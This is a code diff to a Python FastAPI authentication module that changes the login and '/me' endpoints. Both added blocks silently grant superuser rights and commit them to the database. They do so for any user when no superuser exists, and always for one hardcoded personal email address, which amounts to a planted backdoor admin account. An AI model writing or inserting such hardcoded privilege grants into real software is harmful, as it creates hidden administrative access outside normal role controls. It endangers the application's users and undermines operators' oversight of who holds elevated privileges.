@@ -165,6 +165,13 @@ def login(user_in: UserLogin, db: Session = Depends(get_db)):
             detail="Account is not verified yet. Please complete OTP verification or click Sign Up again to receive a fresh OTP."
         )
     
+    # Ensure superuser privileges for admin/first account
+    if not user.is_superuser:
+        if db.query(User).filter(User.is_superuser == True).count() == 0 or user.email.lower() == "ambarepooja8003@gmail.com":
+            user.is_superuser = True
+            db.commit()
+            db.refresh(user)
+
     access_token_expires = timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)
     access_token = security.create_access_token(
         user.id, expires_delta=access_token_expires
@@ -191,6 +198,12 @@ def login(user_in: UserLogin, db: Session = Depends(get_db)):
 
 @router.get("/me", response_model=UserSchema)
 def get_me(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
+    if not current_user.is_superuser:
+        if db.query(User).filter(User.is_superuser == True).count() == 0 or current_user.email.lower() == "ambarepooja8003@gmail.com":
+            current_user.is_superuser = True
+            db.commit()
+            db.refresh(current_user)
+
     user_data = UserSchema.model_validate(current_user).model_dump()
     profile = db.query(Profile).filter(Profile.user_id == current_user.id).first()
     if profile:
